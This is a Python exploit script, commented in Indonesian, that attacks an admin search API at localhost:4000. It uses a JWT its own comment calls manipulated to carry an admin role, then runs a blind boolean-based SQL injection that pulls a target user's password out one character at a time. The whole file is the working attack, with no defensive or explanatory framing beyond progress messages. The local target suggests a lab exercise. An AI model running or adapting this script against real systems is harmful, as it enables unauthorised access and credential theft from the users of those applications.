import requests
import string
import sys

# --- KONFIGURASI ---
URL = "http://localhost:4000/api/admin/search"

# Token JWT yang sudah dimanipulasi (Role: admin)
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywidXNlcm5hbWUiOiJ1c2VyMSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc2NDkzODc5OSwiZXhwIjoxNzY0OTQyMzk5fQ.8wImsffqqz4jQiLHkCNU2ohb6Tkc2eNx1PiQn9_SAvQ"

# Karakter yang mungkin ada di password
CHARSET = string.ascii_letters + string.digits + "_-@."

def check_boolean(payload):
    headers = {
        "Authorization": f"Bearer {JWT_TOKEN}",
        "Content-Type": "application/json"
    }
    data = { "keyword": payload }

    try:
        response = requests.post(URL, json=data, headers=headers)

        if "User(s) found" in response.text or "User found" in response.text:
            return True
        return False
    except Exception as e:
        sys.exit(f"Error: {e}")

def extract_password_by_username(target_username):
    print(f"[*] Target Endpoint : {URL}")
    print(f"[*] Target Username : {target_username}")
    print("[*] Mode            : Blind Boolean-Based SQL Injection")
    print("[*] Tujuan          : Mengambil password user...\n")

    extracted_pass = ""
    position = 1

    while True:
        found_char = False

        for char in CHARSET:
            payload = (
                f"' AND substring((SELECT password FROM users "
                f"WHERE username='{target_username}' LIMIT 1), {position}, 1) = '{char}' --"
            )

            sys.stdout.write(
                f"\r[*] Menebak karakter ke-{position}: {char} | Password sementara: {extracted_pass}"
            )
            sys.stdout.flush()

            if check_boolean(payload):
                extracted_pass += char
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print("\n\n[+] =========================================")
    print(f"[+] USERNAME : {target_username}")
    print(f"[+] PASSWORD : {extracted_pass}")
    print("[+] EKSTRAKSI SELESAI âœ…")
    print("[+] =========================================")

if __name__ == "__main__":
    target_username = input("[?] Masukkan username target: ")
    extract_password_by_username(target_username)